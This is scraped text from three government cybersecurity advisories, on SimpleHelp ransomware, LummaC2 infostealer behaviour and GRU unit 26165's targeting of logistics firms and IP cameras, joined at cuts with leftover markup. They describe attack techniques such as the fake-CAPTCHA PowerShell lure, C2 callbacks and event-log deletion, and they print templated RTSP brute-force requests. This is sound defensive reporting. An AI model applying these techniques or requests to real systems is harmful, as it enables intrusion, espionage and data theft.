href=\"https://www.cisa.gov/sites/default/files/2025-06/aa25-163a-ransomware-simplehelp-rmm-compromise.pdf\" target=\"_blank\">AA25-163A Ransomware Actors Exploit Unpatched SimpleHelp Remote Monitoring and Management to Compromise Utility Billing Software Provider</a>\n(PDF,       420.49 KB\n  )\n\n\n<strong>Mitigations</strong>\n<p>CISA recommends organizations implement the mitigations below to respond to emerging ransomware activity exploiting SimpleHelp software. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"CPGs webpage\">CPGs webpage</a> for more information on the CPGs, including additional recommended baseline protections. These mitigations apply to all critical infrastructure organizations.</p>\nVulnerable Third-Party Vendors\n<p>If SimpleHelp is embedded or bundled in vendor-owned software or if a third-party service provider leverages SimpleHelp on a downstream customer’s network, then identify the SimpleHelp server version at the top of the file <code>&lt;file_path&gt;/SimpleHelp/configuration/serverconfig.xml</code>. If version 5.5.7 or prior is found or has been used since January 2025, third-party vendors should:</p>\n<ol>\n<li>Isolate the SimpleHelp server instance from the internet or stop the server process.</li>\n<li>Upgrade immediately to the latest SimpleHelp version in accordance with SimpleHelp’s security vulnerability advisory.<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-163a#note2\" title=\"Note 2\">2</a></li>\n<li>Contact your downstream customers to direct them to take actions to secure their endpoints and undertake threat hunting actions on their network.</li>\n</ol>\nVulnerable Downstream Customers and End Users\n<p>Determine if the system is running an unpatched version of SimpleHelp RMM either directly or embedded in third-party software.</p>\n<strong>SimpleHelp Endpoints</strong>\n<p>Determine if an endpoint is running the remote access (RAS) service by checking the following paths depending on the specific environment:</p>\n<ul>\n<li>Windows: <code>%APPDATA%\\JWrapper-Remote Access</code></li>\n<li>Linux: <code>/opt/JWrapper-Remote Access</code></li>\n<li>MacOs: <code>/Library/Application Support/JWrapper-Remote Access</code></li>\n</ul>\n<p>If RAS installation is present and running, open the <code>serviceconfig.xml</code> file in <code>&lt;file_path&gt;/JWrapper-Remote Access/JWAppsSharedConfig/</code> to determine if the registered service is vulnerable. The lines starting with <code>&lt;ConnectTo</code> indicate the server addresses where the service is registered.</p>\n<strong>SimpleHelp Server</strong>\n<p>Determine the version of any SimpleHelp server by performing an HTTP query against it. Add <code>/allversions</code> (e.g., <code>https://simple-help.com/allversions</code>) to query the URL for the version page. This page will list the running version.</p>\n<p>If an unpatched SimpleHelp version 5.5.7 or earlier is confirmed on a system, organizations should conduct threat hunting actions for evidence of compromise and continuously monitor for unusual inbound and outbound traffic from the SimpleHelp server. <strong>Note: </strong>This is not an exhaustive list of indicators of compromise.</p>\n<ol>\n<li> Refer to SimpleHelp’s guidance to determine compromise and next steps.<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-163a#note3\" title=\"Note 3\">3</a></li>\n<li>Isolate the SimpleHelp server instance from the internet or stop the server process.</li>\n<li>Search for any suspicious or anomalous executables with three alphabetic letter filenames (e.g., <code>aaa.exe</code>, <code>bbb.exe</code>, etc.) with a creation time after January 2025. Additionally, perform host and network vulnerability security scans via reputable scanning services to verify malware is not on the system.</li>\n<li>Even if there is no evidence of compromise, users should immediately upgrade to the latest SimpleHelp version in accordance with SimpleHelp’s security vulnerabilities advisory.<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-163a#note4\" title=\"Note 4\">4</a></li>\n</ol>\n<p>If your organization is unable to immediately identify and patch vulnerable versions of SimpleHelp, apply appropriate workarounds. In this circumstance, CISA recommends using other vendor-provided mitigations when available. These non-patching workarounds should not be considered permanent fixes and organizations should apply the appropriate patch as soon as it is made available.</p>\nEncrypted Downstream Customers and End Users\n<p>If a system has been encrypted by ransomware:</p>\n<ol>\n<li>Disconnect the affected system from the internet.</li>\n<li>Use clean installation media (e.g., a bootable USD drive or DVD) to reinstall the operating system. Ensure the installation media is free from malware.</li>\n<li>Wipe the system and only restore data from a clean backup. Ensure data files are obtained from a protected environment to avoid reintroducing ransomware to the system.</li>\n</ol>\n<p>CISA urges you to promptly report ransomware incidents to a <a href=\"https://www.fbi.gov/contact-us/field-offices\" target=\"_blank\" title=\"local FBI Field Office\">local FBI Field Office</a>, FBI’s <a href=\"https://www.ic3.gov/\" target=\"_blank\" title=\"Internet Crime Compliant Center (IC3)\">Internet Crime Compliant Center (IC3)</a>, and CISA via CISA’s 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"report@cisa.gov\">report@cisa.gov</a> or 1-844-Say-CISA).</p>\n<strong>Proactive Mitigations to Reduce Risk</strong>\n<p>To reduce opportunities for intrusion and to strengthen response to ransomware activity, CISA recommends customers of vendors and managed service providers (MSPs) implement the following best practices:</p>\n<ul>\n<li>Maintain a robust asset inventory and hardware list [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#AssetInventory1A\" title=\"CPG 1.A\">CPG 1.A</a>].</li>\n<li>Maintain a clean, offline backup of the system to ensure encryption will not occur once reverted. Conduct a daily system backup on a separate, offline device, such as a flash drive or external hard drive. Remove the device from the computer after backup is complete [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#SystemBackups2R\" title=\"CPG 2.R\">CPG 2.R</a>].</li>\n<li>Do not expose remote services such as Remote Desktop Protocol (RDP) on the web. If these services must be exposed, apply appropriate compensating controls to prevent common forms of abuse and exploitation. Disable unnecessary OS applications and network protocols on internet-facing assets [<a href=\"https://www.cisa.gov/cybersecurity-performance-goals-cpgs#NoExploitableServicesontheInternet2W\" title=\"CPG 2.W\">CPG 2.W</a>].</li>\n<li>Conduct a risk analysis for RMM software on the network. If RMM is required, ask third-party vendors what security controls are in place.</li>\n<li>Establish and maintain open communication channels with third-party vendors to stay informed about their patch management process.</li>\n<li>For software vendors, consider integrating a Software Bill of Materials (SBOM) into products to reduce the amount of time for vulnerability remediation.\n<ul>\n<li>An SBOM is a formal record of components used to build software. SBOMs enhance supply chain risk management by quickly identifying and avoiding known vulnerabilities, identifying security requirements, and managing mitigations for vulnerabilities.

LummaC2 malware is able to infiltrate victim computer networks and exfiltrate sensitive information, threatening vulnerable individuals’ and organizations’ computer networks across multiple U.S. critical infrastructure sectors. According to FBI information and trusted third-party reporting, this activity has been observed as recently as May 2025. The IOCs included in this advisory were associated with LummaC2 malware infections from November 2023 through May 2025.</p>\n<p>The FBI and CISA encourage organizations to implement the recommendations in the <strong>Mitigations</strong> section of this advisory to reduce the likelihood and impact of LummaC2 malware.</p>\n<p>Download the PDF version of this report:</p>\n\n\n<a href=\"https://www.cisa.gov/sites/default/files/2025-05/aa25-141b-threat-actors-deploy-lummac2-malware-to-exfiltrate-sensitive-data-from-organizations.pdf\" target=\"_blank\">AA25-141B Threat Actors Deploy LummaC2 Malware to Exfiltrate Sensitive Data from Organizations</a>\n(PDF,       1.28 MB\n  )\n\n\n<p>For a downloadable copy of IOCs, see:</p>\n\n\n<a href=\"https://www.cisa.gov/sites/default/files/2025-05/AA25-141B.stix_.xml\" target=\"_blank\">AA25-141B STIX XML</a>\n(XML,       146.54 KB\n  )\n\n\n\n\n<a href=\"https://www.cisa.gov/sites/default/files/2025-05/AA25-141B-Threat-Actors-Deploy-LummaC2-Malware-to-Exfiltrate-Sensitive-Data-from-Organizations.stix_.json\" target=\"_blank\">AA25-141B STIX JSON</a>\n(JSON,       300.90 KB\n  )\n\n\n<strong>Technical Details</strong>\n<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v17/matrices/enterprise/\" target=\"_blank\" title=\"MITRE ATT&amp;CK® Matrix for Enterprise\">MITRE ATT&amp;CK® Matrix for Enterprise</a> framework, version 17. See the <strong>MITRE ATT&amp;CK Tactics and Techniques</strong> section of this advisory for threat actor activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>\nOverview\n<p>LummaC2 malware first appeared for sale on multiple Russian-language speaking cybercriminal forums in 2022. Threat actors frequently use spearphishing hyperlinks and attachments to deploy LummaC2 malware payloads [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1566/001/\" target=\"_blank\" title=\"T1566.001\">T1566.001</a>, <a href=\"https://attack.mitre.org/versions/v17/techniques/T1566/002/\" title=\"T1566.002\">T1566.002</a>]. Additionally, threat actors rely on unsuspecting users to execute the payload by clicking a fake Completely Automated Public Turing Test to tell Computers and Humans Apart (CAPTCHA). The CAPTCHA contains instructions for users to then open the Windows Run window (Windows Button + R) and paste clipboard contents (“CTRL + V”). After users press “enter” a subsequent Base64-encoded PowerShell process is executed.</p>\n<p>To obfuscate their operations, threat actors have embedded and distributed LummaC2 malware within spoofed or fake popular software (i.e., multimedia player or utility software) [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1036/\" target=\"_blank\" title=\"T1036\">T1036</a>]. The malware’s obfuscation methods allow LummaC2 actors to bypass standard cybersecurity measures, such as Endpoint Detection and Response (EDR) solutions or antivirus programs, designed to flag common phishing attempts or drive-by downloads [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1027/\" target=\"_blank\" title=\"T1027\">T1027</a>].</p>\n<p>Once a victim’s computer system is infected, the malware can exfiltrate sensitive user information, including personally identifiable information, financial credentials, cryptocurrency wallets, browser extensions, and multifactor authentication (MFA) details without immediate detection [<a href=\"https://attack.mitre.org/versions/v17/tactics/TA0010/\" target=\"_blank\" title=\"TA0010\">TA0010</a>, <a href=\"https://attack.mitre.org/versions/v17/techniques/T1119/\" target=\"_blank\" title=\"T1119\">T1119</a>]. Private sector statistics indicate there were more than 21,000 market listings selling LummaC2 logs on multiple cybercriminal forums from April through June of 2024, a 71.7 percent increase from April through June of 2023.</p>\nFile Execution\n<p>Upon execution, the <code>LummaC2.exe</code> file will enter its main routine, which includes four sub-routines (see <strong>Figure 1</strong>).</p>\n\n \n\n<em>Figure 1. LummaC2 Main Routine</em>\n\n<p>The first routine decrypts strings for a message box that is displayed to the user (see <strong>Figure 2</strong>).</p>\n\n \n\n<em>Figure 2. Message Box</em>\n\n<p>If the user selects <code>No</code>, the malware will exit. If the user selects <code>Yes</code>, the malware will move on to its next routine, which decrypts its callback Command and Control (C2) domains [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1140/\" target=\"_blank\" title=\"T1140\">T1140</a>]. A list of observed domains is included in the <strong>Indicators of Compromise</strong> section.</p>\n<p>After each domain is decoded, the implant will attempt a <code>POST</code> request [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1071/001/\" target=\"_blank\" title=\"T1071.001\">T1071.001</a>] (see <strong>Figure 3</strong>).</p>\n\n \n\n<em>Figure 3. </em><code><em>Post</em></code><em> Request</em>\n\n<p>If the <code>POST</code> request is successful, a pointer to the decoded domain string is saved in a global variable for later use in the main C2 routine used to retrieve JSON formatted commands (see <strong>Figure 4</strong>).</p>\n\n \n\n<em>Figure 4. Code Saving Successful Callback Request</em>\n\n<p>Once a valid C2 domain is contacted and saved, the malware moves on to the next routine, which queries the user’s name and computer name utilizing the Application Programming Interfaces (APIs) <code>GetUserNameW</code> and <code>GetComputerNameW</code> respectively [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1012/\" target=\"_blank\" title=\"T1012\">T1012</a>]. The returned data is then hashed and compared against a hard-coded hash value (see <strong>Figure 5</strong>).</p>\n\n \n\n<em>Figure 5. User and Computer Name Check</em>\n\n<p>The hashing routine was not identified as a standard algorithm; however, it is a simple routine that converts a Unicode string to a 32-bit hexadecimal value.</p>\n<p>If the username hash is equal to the value <code>0x56CF7626</code>, then the computer name is queried. If the computer name queried is seven characters long, then the name is hashed and checked against the hard-coded value of <code>0xB09406C7</code>. If both values match, a final subroutine will be called with a static value of the computer name hash as an argument. If this routine is reached, the process will terminate. This is most likely a failsafe to prevent the malware from running on the attacker’s system, as its algorithms are one-way only and will not reveal information on the details of the attacker’s own hostname and username.</p>\n<p>If the username and hostname check function returns <code>zero</code> (does not match the hard-coded values), the malware will enter its main callback routine. The LummaC2 malware will contact the saved hostname from the previous check and send the following <code>POST</code> request (see <strong>Figure 6</strong>).</p>\n\n \n\n<em>Figure 6. Second </em><code><em>POST</em></code><em> Request</em>\n\n<p>The data returned from the C2 server is encrypted. Once decoded, the C2 data is in a JSON format and is parsed by the LummaC2 malware. The C2 uses the JSON configuration to parse its browser extensions and target lists using the <code>ex</code> key, which contains an array of objects (see <strong>Figure 7</strong>).</p>\n\n \n\n<em>Figure 7. Parsing of </em><code><em>ex</em></code><em> JSON Value</em>\n\n<p>Parsing the <code>c</code> key contains an array of objects, which will give the implant its C2 (see <strong>Figure 8</strong>).</p>\n\n \n\n<em>Figure 8. Parsing of </em><code><em>c</em></code><em> JSON Value</em>\n\nC2 Instructions\n<p>Each array object that contains the JSON key value of <code>t</code> will be evaluated as a command opcode, resulting in the C2 instructions in the subsections below.</p>\n<strong>1. Opcode </strong><code><strong>0</strong></code><strong> – Steal Data Generic</strong>\n<p>This command allows five fields to be defined when stealing data, offering the most flexibility.

    "summary": "<strong>Executive Summary</strong>\n<p>This joint cybersecurity advisory (CSA) highlights a Russian state-sponsored cyber campaign targeting Western logistics entities and technology companies. This includes those involved in the coordination, transport, and delivery of foreign assistance to Ukraine. Since 2022, Western logistics entities and IT companies have faced an elevated risk of targeting by the Russian General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (85th GTsSS), military unit 26165—tracked in the cybersecurity community under several names (see “<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a#CybersecurityIndustryTracking\" title=\"CybersecurityIndustryTracking\">Cybersecurity Industry Tracking</a>”). The actors’ cyber espionage-oriented campaign, targeting technology companies and logistics entities, uses a mix of previously disclosed tactics, techniques, and procedures (TTPs). The authoring agencies expect similar targeting and TTP use to continue.</p>\n<p>Executives and network defenders at logistics entities and technology companies should recognize the elevated threat of unit 26165 targeting, increase monitoring and threat hunting for known TTPs and indicators of compromise (IOCs), and posture network defenses with a presumption of targeting.</p>\n<p>This cyber espionage-oriented campaign targeting logistics entities and technology companies uses a mix of previously disclosed TTPs and is likely connected to these actors’ wide scale targeting of IP cameras in Ukraine and bordering NATO nations.</p>\n<p>The following authors and co-sealers are releasing this CSA:</p>\n<ul>\n<li>United States National Security Agency (NSA)</li>\n<li>United States Federal Bureau of Investigation (FBI)</li>\n<li>United Kingdom National Cyber Security Centre (NCSC-UK)</li>\n<li>Germany Federal Intelligence Service (BND) Bundesnachrichtendienst</li>\n<li>Germany Federal Office for Information Security (BSI) Bundesamt für Sicherheit in der Informationstechnik</li>\n<li>Germany Federal Office for the Protection of the Constitution (BfV) Bundesamt für Verfassungsschutz</li>\n<li>Czech Republic Military Intelligence (VZ)  Vojenské zpravodajství</li>\n<li>Czech Republic National Cyber and Information Security Agency (NÚKIB) Národní úřad pro kybernetickou a informační bezpečnost</li>\n<li>Czech Republic Security Information Service (BIS) Bezpečnostní informační služba</li>\n<li>Poland Internal Security Agency (ABW) Agencja Bezpieczeństwa Wewnętrznego</li>\n<li>Poland Military Counterintelligence Service (SKW) Służba Kontrwywiadu Wojskowego</li>\n<li>United States Cybersecurity and Infrastructure Security Agency (CISA)</li>\n<li>United States Department of Defense Cyber Crime Center (DC3)</li>\n<li>United States Cyber Command (USCYBERCOM)</li>\n<li>Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC)</li>\n<li>Canadian Centre for Cyber Security (CCCS)</li>\n<li>Danish Defence Intelligence Service (DDIS) Forsvarets Efterretningstjeneste</li>\n<li>Estonian Foreign Intelligence Service (EFIS) Välisluureamet</li>\n<li>Estonian National Cyber Security Centre (NCSC-EE) Küberturvalisuse keskus</li>\n<li>French Cybersecurity Agency (ANSSI) Agence nationale de la sécurité des systèmes d'information</li>\n<li>Netherlands Defence Intelligence and Security Service (MIVD) Militaire Inlichtingen- en Veiligheidsdienst<br> </li>\n</ul>\n<p>Download the PDF version of this report:</p>\n<ul>\n<li><a href=\"https://media.defense.gov/2025/May/21/2003719846/-1/-1/0/CSA_RUSSIAN_GRU_TARGET_LOGISTICS.PDF\" target=\"_blank\" title=\"Russian GRU Targeting Western Logistics Entities and Technology Companies \">Russian GRU Targeting Western Logistics Entities and Technology Companies</a> (PDF, 1,081KB)</li>\n</ul>\n<p>For a downloadable list of IOCs, visit:</p>\n\n\n<a href=\"https://www.cisa.gov/sites/default/files/2025-05/AA25-141A-Russian-GRU-Targeting-Western-Logistics-Entities-and-Technology-Companies.stix_.xml\" target=\"_blank\">AA25-141A STIX XML</a>\n(XML,       117.02 KB\n  )\n\n\n\n\n<a href=\"https://www.cisa.gov/sites/default/files/2025-05/AA25-141A-Russian-GRU-Targeting-Western-Logistics-Entities-and-Technology-Companies.stix_.json\" target=\"_blank\">AA25-141A STIX JSON</a>\n(JSON,       144.29 KB\n  )\n\n\n<strong>Introduction</strong>\n<p>For over two years, the Russian GRU 85th GTsSS, military unit 26165—commonly known in the cybersecurity community as APT28, Fancy Bear, Forest Blizzard, BlueDelta, and a variety of other identifiers—has conducted this campaign using a mix of known tactics, techniques, and procedures (TTPs), including reconstituted password spraying capabilities, spearphishing, and modification of Microsoft Exchange mailbox permissions.</p>\n<p>In late February 2022, multiple Russian state-sponsored cyber actors increased the variety of cyber operations for purposes of espionage, destruction, and influence—with unit 26165 predominately involved in espionage. [<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a#cited1\" title=\"1\">1</a>] As Russian military forces failed to meet their military objectives and Western countries provided aid to support Ukraine’s territorial defense, unit 26165 expanded its targeting of logistics entities and technology companies involved in the delivery of aid. These actors have also targeted Internet-connected cameras at Ukrainian border crossings to monitor and track aid shipments.</p>\n<p>Note: This advisory uses the MITRE ATT&amp;CK® for Enterprise framework, version 17. See <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a#appendixa\" title=\"Appendix A\">Appendix A: MITRE ATT&amp;CK tactics and techniques</a> for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques. This advisory uses the MITRE D3FEND® framework, version 1.0.</p>\n<strong>Description of Targets</strong>\n<p>The GRU unit 26165 cyber campaign against Western logistics providers and technology companies has targeted dozens of entities, including government organizations and private/commercial entities across virtually all transportation modes: air, sea, and rail. These actors have targeted entities associated with the following verticals within NATO member states, Ukraine, and at international organizations: </p>\n<ul>\n<li> Defense Industry</li>\n<li>Transportation and Transportation Hubs (ports, airports, etc.)</li>\n<li>Maritime</li>\n<li>Air Traffic Management</li>\n<li>IT Services</li>\n</ul>\n<p>In the course of the targeting lifecycle, unit 26165 actors identified and conducted follow-on targeting of additional entities in the transportation sector that had business ties to the primary target, exploiting trust relationships to attempt to gain additional access [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1199/\" target=\"_blank\" title=\"T1199\">T1199</a>].</p>\n<p>The actors also conducted reconnaissance on at least one entity involved in the production of industrial control system (ICS) components for railway management, though a successful compromise was not confirmed [<a href=\"https://attack.mitre.org/versions/v17/tactics/TA0043/\" target=\"_blank\" title=\"TA0043\">TA0043</a>].</p>\n<p>The countries with targeted entities include the following, as illustrated in <strong>Figure 1</strong>:</p>\n<ul>\n<li>Bulgaria</li>\n<li>Czech Republic</li>\n<li>France</li>\n<li>Germany</li>\n<li>Greece</li>\n<li>Italy</li>\n<li>Moldova</li>\n<li>Netherlands</li>\n<li>Poland</li>\n<li>Romania</li>\n<li>Slovakia</li>\n<li>Ukraine</li>\n<li>United States<br> </li>\n</ul>\n\n \n\nFigure 1: Countries with Targeted Entities\n\n<strong>Initial Access TTPs</strong>\n<p>To gain initial access to targeted entities, unit 26165 actors used several techniques to gain initial access to targeted entities, including (but not limited to):</p>\n<ul>\n<li>Credential guessing [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1110/001/\" target=\"_blank\" title=\"T1110.001\">T1110.001</a>] / brute force [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1110/003/\" target=\"_blank\" title=\"T1110.003\">T1110.003</a>]</li>\n<li>Spearphishing for credentials [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1566/\" target=\"_blank\" title=\"T1566\">T1566</a>]</li>\n<li>Spearphishing delivering malware [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1566/\" target=\"_blank\" title=\"T1566\">T1566</a>]</li>\n<li>Outlook NTLM vulnerability (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-23397\" target=\"_blank\" title=\"CVE-2023-23397\">CVE-2023-23397</a>)</li>\n<li>Roundcube vulnerabilities (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-12641\" target=\"_blank\" title=\"CVE-2020-12641\">CVE-2020-12641</a>, <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-35730\" target=\"_blank\" title=\"CVE-2020-35730\">CVE-2020-35730</a>, <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-44026\" target=\"_blank\" title=\"CVE-2021-44026\">CVE-2021-44026</a>)</li>\n<li>Exploitation of Internet-facing infrastructure, including corporate VPNs [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1133/\" target=\"_blank\" title=\"T1133\">T1133</a>], via public vulnerabilities and SQL injection [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1190/\" target=\"_blank\" title=\"T1190\">T1190</a>]</li>\n<li>Exploitation of WinRAR vulnerability (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-38831\" target=\"_blank\" title=\"CVE-2023-38831\">CVE-2023-38831</a>)</li>\n</ul>\n<p>The actors abused vulnerabilities associated with a range of brands and models of small office/home office (SOHO) devices to facilitate covert cyber operations, as well as proxy malicious activity via devices with geolocation in proximity to the target [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1665/\" target=\"_blank\" title=\"T1665\">T1665</a>].

These webpages were typically hosted on free third-party services or compromised SOHO devices and often used legitimate documents associated with thematically similar entities as lures. The subjects of spearphishing emails were diverse and ranged from professional topics to adult themes. Phishing emails were frequently sent via compromised accounts or free webmail accounts [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1586/002/\" target=\"_blank\" title=\"T1586.002\">T1586.002</a>, <a href=\"https://attack.mitre.org/versions/v17/techniques/T1586/003/\" target=\"_blank\" title=\"T1586.003\">T1586.003</a>]. The emails were typically written in the target’s native language and sent to a single targeted recipient. </p>\n<p>Some campaigns employed multi-stage redirectors [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1104/\" target=\"_blank\" title=\"T1104\">T1104</a>] verifying IP-geolocation [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1627/001/\" target=\"_blank\" title=\"T1627.001\">T1627.001</a>] and browser fingerprints [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1627/001/\" target=\"_blank\" title=\"T1627\">T1627</a>] to protect credential harvesting infrastructure or provide multifactor authentication (MFA) [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1111/\" target=\"_blank\" title=\"T1111\">T1111</a>] and CAPTCHA relaying capabilities [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1056/\" target=\"_blank\" title=\"T1056\">T1056</a>].

The actors would additionally delete event logs through the wevtutil utility [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1070/001/\" target=\"_blank\" title=\"T1070.001\">T1070.001</a>].</p>\n<p>After gaining initial access to the network, the actors pursued further access to accounts with access to sensitive information on shipments, such as train schedules and shipping manifests. These accounts contained information on aid shipments to Ukraine, including: </p>\n<ul>\n<li>sender,</li>\n<li>recipient,</li>\n<li>train/plane/ship numbers,</li>\n<li>point of departure,</li>\n<li>destination,</li>\n<li>container registration numbers,</li>\n<li>travel route, and</li>\n<li>cargo contents. </li>\n</ul>\n<p>In at least one instance, the actors attempted to use voice phishing [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1566/004/\" target=\"_blank\" title=\"T1566.004\">T1566.004</a>] to gain access to privileged accounts by impersonating IT staff.</p>\nMalware\n<p>Unit 26165’s use of malware in this campaign ranged from gaining initial access to establishing persistence and exfiltrating data. In some cases, the attack chain resulted in multiple pieces of malware being deployed in succession. The actors used dynamic link library (DLL) search order hijacking [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1574/001/\" target=\"_blank\" title=\"T1574.001\">T1574.001</a>] to facilitate malware execution. There were a number of known malware variants tied to this campaign against logistics sector victims, including:</p>\n<ul>\n<li>HEADLACE [<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a#cited7\" title=\"7\">7</a>]</li>\n<li>MASEPIE [<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a#cited8\" title=\"8\">8</a>]</li>\n</ul>\n<p>While other malware variants, such as OCEANMAP and STEELHOOK, [<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a#cited8\" title=\"8\">8</a>] were not directly observed targeting logistics or IT entities, their deployment against victims in other sectors in Ukraine and other Western countries suggest that they could be deployed against logistics and IT entities should the need arise. </p>\nPersistence\n<p>In addition to the abovementioned mailbox permissions abuse, unit 26165 actors also used scheduled tasks [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1053/005/\" target=\"_blank\" title=\"T1053.005\">T1053.005</a>], run keys [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1547/001/\" target=\"_blank\" title=\"T1547.001\">T1547.001</a>], and placed malicious shortcuts [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1547/009/\" target=\"_blank\" title=\"T1547.009\">T1547.009</a>] in the startup folder to establish persistence. </p>\nExfiltration\n<p>GRU unit 26165 actors used a variety of methods for data exfiltration that varied based on the victim environment, including both malware and living off the land binaries. PowerShell commands [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1059/001/\" target=\"_blank\" title=\"T1059.001\">T1059.001</a>] were often used to prepare data for exfiltration; for example, the actors prepared zip archives [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1560/001/\" target=\"_blank\" title=\"T1560.001\">T1560.001</a>] for upload to their own infrastructure. </p>\n<p>The actors also used server data exchange protocols and Application Programming Interfaces (APIs) such as Exchange Web Services (EWS) and Internet Message Access Protocol (IMAP) [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1114/002/\" target=\"_blank\" title=\"T1114.002\">T1114.002</a>] to exfiltrate data from email servers. In multiple instances, the actors used periodic EWS queries [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1119/\" target=\"_blank\" title=\"T1119\">T1119</a>] to collect new emails sent and received since the last data exfiltration [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1029/\" target=\"_blank\" title=\"T1029\">T1029</a>]. The actors typically used infrastructure in close geographic proximity to the victim. Long gaps between exfiltration, the use of trusted and legitimate protocols, and the use of local infrastructure allowed for long-term collection of sensitive data to go undetected. </p>\n<strong>Connections to Targeting of IP Cameras</strong>\n<p>In addition to targeting logistics entities, unit 26165 actors likely used access to private cameras at key locations, such as near border crossings, military installations, and rail stations, to track the movement of materials into Ukraine. The actors also used legitimate municipal services, such as traffic cams. </p>\n<p>The actors targeted Real Time Streaming Protocol (RTSP) servers hosting IP cameras primarily located in Ukraine as early as March 2022 in a large-scale campaign, which included attempts to enumerate devices [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1592/\" target=\"_blank\" title=\"T1592\">T1592</a>] and gain access to the cameras’ feeds [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1125/\" target=\"_blank\" title=\"T1125\">T1125</a>]. Actor-controlled servers sent RTSP DESCRIBE requests destined for RTSP servers, primarily hosting IP cameras [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1090/002/\" target=\"_blank\" title=\"T1090.002\">T1090.002</a>]. The DESCRIBE requests were crafted to obtain access to IP cameras located on logically distinct networks from that of the routers that received the request. The requests included Base64-encoded credentials for the RTSP server, which included publicly documented default credentials and likely generic attempts to brute force access to the devices [<a href=\"https://attack.mitre.org/versions/v17/techniques/T1110/\" target=\"_blank\" title=\"T1110\">T1110</a>]. An example of an RTSP request is shown in <strong>Figure 3</strong>.</p>\n\n\nFigure 3: Example RTSP request\n\n\n\n<p><code>DESCRIBE rtsp://[IP ADDRESS] RTSP/1.0</code></p>\n<p><code>CSeq: 1</code></p>\n<p><code>Authorization: Basic &lt;Base64-encoded credentials&gt;</code></p>\n<p><code>User-Agent: WebClient</code></p>\n<p><code>Accept: application/sdp</code></p>\n<p> </p>\n<p><code>DESCRIBE rtsp://[IP ADDRESS] RTSP/1.0</code></p>\n<p><code>CSeq: 2</code></p>\n<p><code>Authorization: Digest username=\"admin\", realm=\"[a-f0-9]{12}\", algorithm=\"MD5\", nonce=\"[a-f0-9]{32}\", uri=\"\", response=\"[a-f0-9]{32}\"</code></p>\n<p><code>User-Agent: WebClient</code></p>\n<p><code>Accept: application/sdp</code></p>\n\n\n\n\n<p>Successful RTSP 200 OK responses contained a snapshot of the IP camera's image and IP camera metadata such as video codec, resolution, and other properties depending on the IP camera's configuration. </p>\n<p>From a sample available to the authoring agencies of over 10,000 cameras targeted via this effort, the geographic distribution of victims showed a strong focus on cameras in Ukraine and border countries, as shown in <strong>Table 1</strong>:</p>\n\nTable 1: Geographic distribution of targeted IP cameras\n\n\n<strong>Country</strong>\n<strong>Percentage of Total Attempts</strong>\n\n\n\n\nUkraine\n81.0%\n\n\nRomania\n9.9%\n\n\nPoland\n4.0%\n\n\nHungary\n2.8%\n\n\nSlovakia\n1.7%\n\n\nOthers\n0.6%\n\n\n\n\n<strong>Mitigation Actions</strong>\n<strong>General Security Mitigations</strong>\n<p><strong>Architecture and Configuration</strong></p>\n<ul>\n<li>Employ appropriate network segmentation [<a href=\"https://d3fend.mitre.org/technique/d3f:NetworkIsolation/\" target=\"_blank\" 